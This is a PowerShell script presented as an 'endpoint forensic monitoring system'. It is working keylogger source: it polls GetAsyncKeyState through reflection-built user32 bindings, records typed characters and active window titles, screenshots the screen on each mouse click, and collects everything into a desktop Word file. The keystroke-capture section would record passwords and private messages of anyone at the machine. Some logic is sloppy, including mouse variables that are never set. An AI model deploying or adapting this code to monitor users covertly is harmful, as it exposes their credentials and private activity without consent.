<#
Author: Lukeman Hakkim Sheik Alavudeen

Title: EndPoint forensic monitoring system

Description: 

This software monitors the following task

1. Takes screenshot when there is a mouse click event

2. Captures the Mouse coordinates when there is a mouse event

3. Logs the keystrokes Events

4. All the data and screenshot is stored in a word document

Prerequisites:

1. Install IrfanView software in "C:\Program Files\IrfanView" to take screenshot along with mouse pointer.
2. Create a folder name "screenshots" in desktop. 
Default path: $home\Desktop\screenshots\screenshot1.bmp
Enhancement: Take screenshot folder path as input and create the folder.
3. Create a word document named Images.docx in desktop to store all the data.
Enhancement: Take the word file path as input and create the file dynamically.
Default path: "$home/Desktop/Images.docx"
#>


$Time = Read-Host "Enter the time(in Seconds) to monitor the system"

#Stopwatch
$stopWatch = [system.diagnostics.stopwatch]::StartNew()
$timeSpan = New-TimeSpan -Minutes 0 -Seconds $Time


##########################
# To capture a screenshot
##########################


function take_screenshots ($File)
{
    cd "C:\Program Files\IrfanView"
    .\i_view64.exe /capture=0 /convert=$File
    Write-Output "Screenshot saved to:"
    Write-Output $File
}

 ##To capture the keystrokes
 
            [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null

            try
            {
                $ImportDll = [User32]
            }
            catch
            {
                $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
                $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
                $TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')

                $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
                $FieldArray = [Reflection.FieldInfo[]] @(
                    [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
                )

                $PInvokeMethod = $TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
                $FieldValueArray = [Object[]] @(
                    'GetAsyncKeyState',
                    $True,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
                $FieldValueArray = [Object[]] @(
                    'GetKeyboardState',
                    $True,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('MapVirtualKey', 'Public, Static', [Int32], [Type[]] @([Int32], [Int32]))
                $FieldValueArray = [Object[]] @(
                    'MapVirtualKey',
                    $False,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
                    [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
                $FieldValueArray = [Object[]] @(
                    'ToUnicode',
                    $False,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
                $FieldValueArray = [Object[]] @(
                    'GetForegroundWindow',
                    $True,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $ImportDll = $TypeBuilder.CreateType()
            }


#Keylogger function
        function Start-KeyLogger()
               
               {
                    Start-Sleep -Milliseconds 70

                    #loop through typeable characters to see which is pressed
                    for ($TypeableChar = 1; $TypeableChar -le 254; $TypeableChar++)
                    {
                        $VirtualKey = $TypeableChar
                        $KeyResult = $ImportDll::GetAsyncKeyState($VirtualKey)

                        #if the key is pressed
                        if (($KeyResult -band 0x8000) -eq 0x8000)
                        {

                            #check for keys not mapped by virtual keyboard
                            $LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
                            $RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
                            $LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                            $RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
                            $LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
                            $RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
                            $TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
                            $SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
                            $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                            $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                            $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
                            $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
                            $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
                            $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
                            $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
                        
                            
                            if ($LeftShift) {$LogOutput = '[LShift]'}
                            if ($LeftCtrl)  {$LogOutput = '[LCtrl]'}
                            if ($LeftAlt)   {$LogOutput = '[LAlt]'}          
                            if ($RightShift) {$LogOutput = '[RShift]'}
                            if ($RightCtrl)  {$LogOutput = '[RCtrl]'}
                            if ($RightAlt)   {$LogOutput = '[RAlt]'}
                            if ($TabKey)       {$LogOutput = '[Tab]'}
                            if ($SpaceBar)     {$LogOutput = '[SpaceBar]'}
                            if ($DeleteKey)    {$LogOutput = '[Delete]'}
                            if ($EnterKey)     {$LogOutput = '[Enter]'}
                            if ($BackSpaceKey) {$LogOutput = '[Backspace]'}
                            if ($LeftArrow)    {$LogOutput = '[Left Arrow]'}
                            if ($RightArrow)   {$LogOutput = '[Right Arrow]'}
                            if ($UpArrow)      {$LogOutput = '[Up Arrow]'}
                            if ($DownArrow)    {$LogOutput = '[Down Arrow]'}
                            if ($LeftMouse)    {$LogOutput = '[Left Mouse]'}
                            if ($RightMouse)   {$LogOutput = '[Right Mouse]'}

                            #check for capslock
                            if ([Console]::CapsLock) {$LogOutput = '[Caps Lock]'}

                            $MappedKey = $ImportDll::MapVirtualKey($VirtualKey, 3)
                            $KeyboardState = New-Object Byte[] 256
                            $CheckKeyboardState = $ImportDll::GetKeyboardState($KeyboardState)

                            #create a stringbuilder object
                            $StringBuilder = New-Object -TypeName System.Text.StringBuilder;
                            $UnicodeKey = $ImportDll::ToUnicode($VirtualKey, $MappedKey, $KeyboardState, $StringBuilder, $StringBuilder.Capacity, 0)


                            $mychar = $StringBuilder.ToString()

                            #convert typed characters
                            if ($UnicodeKey -gt 0) {
                                $TypedCharacter = $StringBuilder.ToString()
                                $LogOutput += ($TypedCharacter)
                 
                            }



                            #get the title of the foreground window
                            $TopWindow = $ImportDll::GetForegroundWindow()
                            $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
                            $temp_dict = @{'Key Typed' = $LogOutput}
                            if ($temp_dict['Key Typed'] -match "\[Enter]"){
                            $LogOutput = "     [ " + $WindowTitle + " ]" + "`n"
                            }

                            Start-Sleep -Milliseconds 20

                            return $LogOutput

                        }
                    }
                }
                ##################################################################


##############################################
#1.To Monitor the mouse clicks
#2.To take screenshots on mouse click
#3.To monitor the keystrokes
##############################################

$count=0
$dict_count=1
$master_dict=@{}

do
{

 $mouse_events = [System.Windows.Forms.UserControl]::MouseButtons
 if (($mouse_events -like "left") -or ($mouse_events -like "right"))
 {
     
     #To monitor the mouse coordinates
     $pos = [System.Windows.Forms.Cursor]::Position
     $pos_str = "Mouse coordinates are $pos`n"

     #count for mouse coordinates
     $master_dict.Add($dict_count, $pos_str)
     $dict_count+=1


     #To capture the screenshots on click  
     $count +=1
     #Can change the screenshot folder path
     $File = "$home\Desktop\screenshots\MyScreenshot" + $count + ".bmp"
     take_screenshots ($File)

     #count for screenshots
     $master_dict.Add($dict_count, "Myscreenshot"+$count)
     $dict_count+=1
     
 }

 # records all key presses
 $key_pressed = Start-KeyLogger

 #count for keypressed
 $master_dict.Add($dict_count, $key_pressed)
 $dict_count+=1


}until ($stopWatch.Elapsed -ge $timeSpan)



########################################
#File Handling
########################################

#Can change the file path or take it as a seperate input
$savepath = "$home/Desktop/Images.docx"
$wdStory = 6 
$wdMove = 0
$objWord = New-object -comobject Word.Application  
$objWord.Visible = $True 
$objDoc = $objWord.Documents.Open($savepath) 
$objSelection = $objWord.Selection 
$a = $objSelection.EndKey($wdStory, $wdMove) 
$objSelection.TypeParagraph() 
$objSelection.TypeParagraph() 



###############################################
#To  write data in a sequential Manner 
###############################################
for ($i = 1; $i -lt $master_dict.Count+1; $i++)

    {
    
    $key = $i
    $value=$master_dict[$i]

    Write-Host ("Key = " + $key + " and Value = " + $value);


    #Wordfile: To skip empty string
    if ($value -like "")
    {
    continue
    }

    else

    {


        ###########################################
        #To modify the text Format 
        ###########################################  

        if ((($value).Contains("Myscreenshot")) -eq "True")
        {
        #To write the image file
        $objSelection.TypeParagraph()

        #Add screenshot to the word file
        $objShape = $objSelection.InlineShapes.AddPicture("$home\Desktop\screenshots\$value"+".bmp")
        $objSelection.TypeParagraph()
        Start-Sleep -Seconds 1
        continue
        }
        else
        {

         if($value -match "\[Enter]") {
         $objSelection.TypeText("`n")
         }

         elseif($value -eq "[SpaceBar] ") {
         $objSelection.TypeText(" ")
         }

         elseif($value -match "\[\w+\]") {
         $objSelection.TypeParagraph()
         $objSelection.TypeText($value)
         }

         elseif($value -match "\[\w+\]\[\w+\]") {
         $objSelection.TypeParagraph()
         $objSelection.TypeText($value)
         }

         elseif ((($value).Contains("Mouse")) -eq "True"){
         $objSelection.TypeParagraph()
         $objSelection.TypeParagraph()
         $objSelection.TypeText($value)
         }

         else{
         $objSelection.TypeText($value)
         }
        }
    }
}   

$objdoc.SaveAs([ref]$savepath) 
$objdoc.Close() 
$objword.quit() 





